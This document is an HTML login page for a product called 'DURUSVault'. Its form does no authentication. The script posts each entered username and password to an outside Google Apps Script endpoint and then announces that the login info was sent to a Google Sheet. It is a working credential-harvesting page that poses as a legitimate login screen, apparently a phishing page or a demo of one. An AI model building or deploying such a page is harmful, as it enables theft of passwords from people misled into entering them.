<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>DURUSVault Login</title>
  <style>
    body {
      font-family: 'Segoe UI', sans-serif;
      background: #eaeaea;
      margin: 0;
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
    }
    .login-container {
      background: white;
      padding: 20px;
      border-radius: 10px;
      box-shadow: 0 5px 15px rgba(0,0,0,0.1);
      width: 90%;
      max-width: 350px;
    }
    h2 {
      text-align: center;
      margin-bottom: 20px;
      color: #333;
    }
    input[type="text"], input[type="password"] {
      width: 100%;
      padding: 12px;
      margin-bottom: 15px;
      border: 1px solid #ccc;
      border-radius: 5px;
      box-sizing: border-box;
    }
    button {
      width: 100%;
      padding: 12px;
      background: #0078D7;
      color: white;
      border: none;
      border-radius: 5px;
      font-weight: bold;
      cursor: pointer;
    }
    button:hover {
      background: #005a9e;
    }
    .footer {
      margin-top: 20px;
      text-align: center;
      font-size: 0.9em;
      color: #777;
    }
  </style>
</head>
<body>
  <div class="login-container">
    <h2>Welcome to DURUSVault</h2>
    <form onsubmit="handleLogin(event)">
      <input type="text" id="username" placeholder="Username" required>
      <input type="password" id="password" placeholder="Password" required>
      <button type="submit">Log In</button>
    </form>
    <div class="footer">Â© 2025 DURUSVault Inc.</div>
  </div>

  <script>
    function handleLogin(event) {
      event.preventDefault();
      const user = document.getElementById('username').value;
      const pass = document.getElementById('password').value;

      fetch('https://script.google.com/macros/s/AKfycbxMMkAHfIB7-It0kEG4v509TYgbMo0EEmDK2BnjloMvLMlG1seAyWfVCIebjF1LlNN6SA/exec', {
        method: 'POST',
        body: JSON.stringify({ username: user, password: pass }),
        headers: {
          'Content-Type': 'application/json'
        }
      })
      .then(response => alert('Login info sent to Google Sheet!'))
      .catch(error => alert('Error sending data: ' + error));
    }
  </script>
</body>
</html>
